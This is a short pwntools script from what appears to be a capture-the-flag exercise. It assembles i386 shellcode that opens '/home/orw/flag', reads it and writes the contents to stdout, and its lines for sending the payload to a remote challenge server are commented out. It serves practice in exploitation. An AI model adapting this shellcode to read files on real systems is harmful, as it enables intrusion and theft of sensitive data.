#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

# r = remote("csie.ctf.tw", 10134)

sc = asm(
"""
    jmp hello
write:
    pop ebx
    mov eax,5
    mov ecx,0
    int 0x80

    mov ebx,eax
    mov ecx,esp
    mov edx,0x60
    mov eax,3
    int 0x80

    mov edx,eax
    mov ebx,1
    mov eax,4
    int 0x80

hello:
    call write
    .ascii "/home/orw/flag"
    .byte 0
""", arch="i386")

print(sc)
# r.recvuntil(":")
# r.sendline(sc)
# r.interactive()
